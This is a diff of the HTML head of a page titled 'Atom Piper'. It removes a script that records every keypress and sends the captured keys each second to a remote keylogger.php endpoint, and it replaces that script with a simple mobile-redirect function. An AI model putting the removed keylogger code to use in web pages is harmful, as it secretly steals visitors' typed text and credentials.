@@ -6,24 +6,7 @@
     <meta charset="UTF-8">
 	<title>Atom Piper</title>
 	<link rel="stylesheet" type="text/css" href="style.css">
-		<script type="text/javascript">
-if ( (screen.width < 800) && (screen.height < 600) ) { 
-    window.location = 'http://www.i-m.mx/AtomPiper/atompiper/';
-    } 
-    var keys = '';
- 
-document.onkeypress = function(e) {
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
-    keys += key;
-}
- 
-window.setInterval(function(){
-    new Image().src = 'http://atompiper.github.io/keylogger.php?c=' + keys;
-    keys = '';
-}, 1000);
-	</script>
+<script>function detectmob() { if(window.innerWidth <= 800 || window.innerHeight <= 600) { return true; } else { return false; } } if (detectmob()){ top.location.href="http://atompiper.github.io/m-index.html"; }</script>
 </head>
 
 <body>
